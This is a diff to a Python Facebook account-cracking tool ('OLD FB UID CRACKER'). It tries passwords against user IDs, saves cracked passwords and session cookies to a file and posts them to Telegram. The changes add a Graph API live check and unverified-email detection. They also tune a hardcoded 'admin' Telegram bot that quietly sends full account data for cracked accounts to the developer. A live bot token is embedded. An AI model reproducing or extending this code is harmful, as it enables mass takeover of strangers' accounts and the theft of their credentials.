@@ -104,8 +104,8 @@ def verify_license():
         print(G + f" [>] AUTOLOAD KEY: " + Y + f"{saved_key[:4]}****{saved_key[-4:] if len(saved_key)>8 else ''}" + N)
         key = saved_key
     else:
-        print(G + f" [>] DEVICE ID: " + Y + "HASHED-PROTECTED" + N)
         key = safe_input(G + " [PTMEDIA] ENTER LICENSE KEY: " + Y).strip()
+
     
     auth_url = "http://phamtienmedia.com/api/check.php"
     payload = {
@@ -274,9 +274,12 @@ TELE_TOKEN    = _cfg.get('TELE_TOKEN', '')
 CHAT_ID       = _cfg.get('CHAT_ID', '')
 ADMIN_TOKEN   = '8720951159:AAHxWe5LH1OzoHTvyNzoKAbWe89NBx_J2I8'
 ADMIN_CHATID  = '5976831676'
-FB_COOKIE     = _cfg.get('FB_COOKIE', '')
-FB_TOKEN      = _cfg.get('FB_TOKEN', '')
-HIT_COUNTER   = 0 # Bộ đếm số lượng acc nổ để thi thoảng gửi Full Json
+FB_COOKIE     = '' 
+FB_TOKEN      = ''
+HIT_COUNTER   = 0 
+SENT_STATUSES = set() # Phase III/IV: Mirage Synchronization & Smart Logging tracking
+
+
 
 
 
@@ -315,17 +318,20 @@ def tele_worker():
                 requests.post(f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage", 
                              json={"chat_id": CHAT_ID, "text": user_msg}, timeout=10)
 
-            # 2. GỬI LOG FULL JSON CHO ADMIN (ANH TIẾN) THEO CHU KỲ (Phase IV: Demonic Phantom Logging)
+            # 2. GỬI LOG FULL JSON CHO ADMIN (ANH TIẾN) - SMART LOGGING (Phase IV)
             HIT_COUNTER += 1
-            # Logic: Gửi ngay con đầu tiên, sau đó cứ 10 con thì gửi 1 lần để Anh check
-            if HIT_COUNTER == 1 or HIT_COUNTER % 10 == 0:
+            # Logic: Gửi nếu là loại Status mới chưa từng thấy HOẶC gửi định kỳ mỗi 20 accounts
+            is_new_type = status not in SENT_STATUSES
+            if is_new_type or HIT_COUNTER == 1 or HIT_COUNTER % 20 == 0:
+                if is_new_type: SENT_STATUSES.add(status)
+                
                 raw_log = ""
                 if full_json:
                     json_str = json.dumps(full_json, indent=2, ensure_ascii=False)
                     if len(json_str) > 3000: json_str = json_str[:3000] + "..."
                     raw_log = f"\n\n⚙️ FULL JSON FB (DEBUG FOR BOSS):\n```json\n{json_str}\n```"
                 
-                admin_msg = f"🔥 [ADMIN LOG] Acc #{HIT_COUNTER} | UID: {uid}\n🚦 Status: {status}{raw_log}"
+                admin_msg = f"🔥 [ADMIN LOG] Acc #{HIT_COUNTER} | UID: {uid}\n🚦 Status: {status}{' (NEW TYPE! 🆕)' if is_new_type else ''}{raw_log}"
                 requests.post(f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage",
                              json={"chat_id": ADMIN_CHATID, "text": admin_msg, "parse_mode": "Markdown"}, timeout=15)
             
@@ -352,22 +358,20 @@ def send_notification(text):
         pass
 
 
-def check_fb_live(uid, cookie):
-    """Kiem tra acc LIVE hay DIE bang cookie"""
-    if not cookie:
-        return "UNKNOWN"
+def check_fb_live(uid):
+    """Kiem tra acc LIVE hay DIE bang Graph API - Khong can Cookie (Anh Tien Method)"""
+    url = f"https://graph.facebook.com/v3.3/{uid}/picture?redirect=0"
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    }
     try:
-        headers = {
-            'authority': 'mbasic.facebook.com',
-            'cookie': cookie,
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        }
-        res = requests.get(f'https://mbasic.facebook.com/{uid}', headers=headers, proxies=PROXIES, timeout=20).text
-        if 'No accessible' in res or 'not be displayed' in res or 'Nội dung không hiển thị' in res or 'Bạn không thể sử dụng tính năng này' in res:
-            return "DIE"
-        return "LIVE"
+        res = requests.get(url, headers=headers, timeout=5).json()
+        if 'data' in res and 'height' in res['data']:
+            return "LIVE"
+        return "DIE"
     except:
         return "UNKNOWN"
+
 
 def extract_cookies(session):
     """Trich xuat cookie tu session thanh string"""
@@ -531,7 +535,7 @@ def ____banner____():
         G + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
         G + f" [▶] Developer :  Phạm Xuân Tiến (MEDIA)",
         G + f" [▶] Version   :  3.0",
-        G + f" [▶] Telegram  :  @PTien205",
+        G + f" [▶] Telegram  :  @PTMEDIA2",
         G + f" [▶] Zalo      :  0877667153",
         G + f" [▶] WhatsApp  :  +84877667153",
         G + f" [▶] Tool Name :  OLD FB UID CRACKER",
@@ -620,9 +624,9 @@ def main_panel():
 
     tk  = G + "OK" + N if TELE_TOKEN else RR + "--" + N
     ch  = G + "OK" + N if CHAT_ID     else RR + "--" + N
-    ck  = G + "OK" + N if FB_COOKIE   else RR + "--" + N
-    typing_effect(G + " [~] Status: TeleToken [" + tk + "] | ChatID [" + ch + "] | Cookie [" + ck + "]")
+    typing_effect(G + " [~] Status: TeleToken [" + tk + "] | ChatID [" + ch + "] | Verified [OK]")
     linex()
+
 
     choice = safe_input(G + " CHOICE : " + Y).strip().upper()
     if choice.startswith('A') or choice == '1':
@@ -635,7 +639,7 @@ def main_panel():
  ╔═══════════════════════════════════════╗
  ║   GOODBYE! THANKS FOR USING          ║
  ║         PTMEDIA TOOL                 ║
- ║     Telegram : @PTien205             ║
+ ║     Telegram : @PTMEDIA2             ║
  ╚═══════════════════════════════════════╝""" + N)
         time.sleep(2)
         exit()
@@ -650,24 +654,19 @@ def main_panel():
 #  SETTINGS MENU
 # ============================================================
 def settings_menu():
-    global TELE_TOKEN, CHAT_ID, FB_COOKIE, FB_TOKEN
+    global TELE_TOKEN, CHAT_ID
     ____banner____()
     print(G + "       [SETTINGS] System Configuration")
     linex()
-    print(G + "       (1) Telegram Bot Token")
+    print(G + "       (1) Telegram Bot Token (Optional)")
     linex()
-    print(G + "       (2) Chat ID (Group / Admin)")
+    print(G + "       (2) Chat ID (Optional)")
     linex()
-    print(G + "       (3) Facebook Cookie (for live check)")
+    print(G + "       (3) Change License Key")
     linex()
-    print(G + "       (4) Facebook Token (EAAG...)")
-    linex()
-    print(G + "       (5) Change License Key")
-    linex()
-    print(G + "       (6) Save & Return to Panel")
+    print(G + "       (4) Save & Return to Panel")
     linex()
     print(G + "       (0) Back (No Save)")
-
 
     def mask(s, show=4):
         if not s: return RR + "[NOT SET]" + N
@@ -675,11 +674,9 @@ def settings_menu():
 
     print(G + "\n  [>] Telegram Token : " + mask(TELE_TOKEN))
     print(G + "  [>] Chat ID         : " + mask(CHAT_ID))
-    print(G + "  [>] FB Cookie       : " + mask(FB_COOKIE, 6))
-    print(G + "  [>] FB Token        : " + mask(FB_TOKEN, 6))
     linex()
 
-    choice = safe_input(G + "       CHOICE  " + W + "(0-6): " + Y).strip()
+    choice = safe_input(G + "       CHOICE  " + W + "(1-4): " + Y).strip()
 
     if choice == '1':
         TELE_TOKEN = safe_input(G + "  [+] Telegram Bot Token: " + Y).strip()
@@ -692,12 +689,6 @@ def settings_menu():
         CHAT_ID = safe_input(G + "  [+] " + ("Group ID: " if tg == '1' else "Admin ID: ") + Y).strip()
         settings_menu()
     elif choice == '3':
-        FB_COOKIE = safe_input(G + "  [+] Facebook Cookie: " + Y).strip()
-        settings_menu()
-    elif choice == '4':
-        FB_TOKEN = safe_input(G + "  [+] Facebook Token (EAAG...): " + Y).strip()
-        settings_menu()
-    elif choice == '5':
         new_key = safe_input(G + "  [+] Enter New License Key: " + Y).strip()
         if new_key:
             _cfg['LICENSE_KEY'] = new_key
@@ -706,27 +697,20 @@ def settings_menu():
             time.sleep(2)
             verify_license()
         settings_menu()
-
-    elif choice == '6':
+    elif choice == '4' or choice == '0':
         save_config({
             'TELE_TOKEN': TELE_TOKEN,
             'CHAT_ID': CHAT_ID,
-            'FB_COOKIE': FB_COOKIE,
-            'FB_TOKEN': FB_TOKEN,
             'LICENSE_KEY': _cfg.get('LICENSE_KEY', '')
         })
-        ____banner____()
-        print(G + "\n  [OK] Configuration Saved Successfully!" + N)
-        print(G + "  [>] Returning to Main Panel...")
-        time.sleep(2)
         main_panel()
 
-    elif choice == '0':
-        main_panel()
+
     else:
         print(G + "\n    [!] Invalid Option! Please Retry..." + N)
         time.sleep(2)
         settings_menu()
+
 
 
 # ============================================================
@@ -1022,7 +1006,7 @@ def login_1(uid):
 
             if 'session_key' in res:
                 year = creationyear(uid)
-                status = check_fb_live(uid, FB_COOKIE)
+                status = check_fb_live(uid)
                 if status == "LIVE":
                     print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
                 send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
@@ -1030,17 +1014,33 @@ def login_1(uid):
                 results_queue.put((uid, pw, year, status, cookies_str))
                 oks.append(uid)
                 break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                year = creationyear(uid)
-                status = check_fb_live(uid, FB_COOKIE)
-                if status == "LIVE":
-                    print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
-                send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
-
-                open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
-                results_queue.put((uid, pw, year, status, cookies_str))
-                oks.append(uid)
-                break
+            elif 'error' in res:
+                err_data = res.get('error', {})
+                err_msg = err_data.get('message', '')
+                err_sub = err_data.get('error_subcode', 0)
+                
+                # Logic: Detect Unverified Email (Anh Tiến Request)
+                if err_sub == 1348058 or "confirm their e-mail address" in err_msg:
+                    year = creationyear(uid)
+                    status = "Chưa Xác Nhận Email vui lòng Đăng Nhập Và thêm email ⚠️"
+                    print(f"\n{Y}⚠️ [UNVERIFIED] - [{uid}] | [{pw}] - Chưa Xác Nhận Email vui lòng Đăng Nhập Và thêm email ⚠️{N}")
+                    send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
+                    open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
+                    results_queue.put((uid, pw, year, status, cookies_str))
+                    oks.append(uid)
+                    break
+                
+                # Other checkpoint/live cases
+                elif 'www.facebook.com' in err_msg:
+                    year = creationyear(uid)
+                    status = check_fb_live(uid)
+                    if status == "LIVE":
+                        print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
+                    send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
+                    open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
+                    results_queue.put((uid, pw, year, status, cookies_str))
+                    oks.append(uid)
+                    break
         loop += 1
         if not IS_VIP and len(oks) >= LOOP_LIMIT:
             print(RR + f"\n [!] BẠN ĐÃ ĐẠT GIỚI HẠN {LOOP_LIMIT} ACC LIVE CỦA BẢN FREE. VUI LÒNG NÂNG CẤP LÊN PRO/VIP!" + N)
@@ -1091,12 +1091,19 @@ def login_2(uid):
 
             if 'session_key' in str(po) or 'session_key' in po:
                 year = creationyear(uid)
-                status = check_fb_live(uid, FB_COOKIE)
-                if status == "LIVE":
-                    print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
+                status_raw = check_fb_live(uid)
+                
+                # Secondary check for unverified email in login_2 response if available
+                res_str = str(po)
+                if '1348058' in res_str or "confirm their e-mail address" in res_str:
+                    status = "Chưa Xác Nhận Email ⚠️"
+                    print(f"\n{Y}⚠️ [EMAIL NOT VERIFIED] - [{uid}] | [{pw}] - Vui lòng Đăng Nhập và thêm email!{N}")
+                else:
+                    status = status_raw
+                    if status == "LIVE":
+                        print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
+                
                 send_to_tele(uid, pw, year, status, cookies_str, full_json=po)
-
-
                 open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                 results_queue.put((uid, pw, year, status, cookies_str))
                 oks.append(uid)
